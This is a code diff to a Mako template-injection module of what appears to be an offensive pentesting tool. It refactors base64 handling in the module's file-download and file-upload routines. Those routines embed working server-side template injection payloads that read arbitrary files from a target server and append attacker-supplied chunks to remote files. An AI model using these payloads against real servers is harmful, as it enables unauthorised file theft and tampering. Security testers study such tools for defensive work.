@@ -1,7 +1,8 @@
-from utils.strings import quote, chunkit, base64encode, base64decode, md5
+from utils.strings import quote, chunkit, md5
 from core.check import Check
 from utils.loggers import log
 from utils import rand
+import base64
 
 
 class Mako(Check):
@@ -188,7 +189,7 @@ class Mako(Check):
             return
 
         data_b64encoded = self.inject("""<%% x=__import__("base64").b64encode(open("%s", "rb").read()) %%>${x}""" %  remote_path)
-        data = base64decode(data_b64encoded)
+        data = base64.b64decode(data_b64encoded)
 
         if not md5(data) == md5_remote:
             log.warn('Remote file md5 mismatch, check manually')
@@ -213,8 +214,8 @@ class Mako(Check):
         # Upload file in chunks of 500 characters
         for chunk in chunkit(data, 500):
 
-            chunk_b64 = base64encode(chunk)
-            self.evaluate("""open("%s", 'ab+').write(__import__("base64").b64decode('%s'))""" % (remote_path, chunk_b64))
+            chunk_b64 = base64.urlsafe_b64encode(chunk)
+            self.evaluate("""open("%s", 'ab+').write(__import__("base64").urlsafe_b64decode('%s'))""" % (remote_path, chunk_b64))
 
         if not md5(data) == self._md5(remote_path):
             log.warn('Remote file md5 mismatch, check manually')
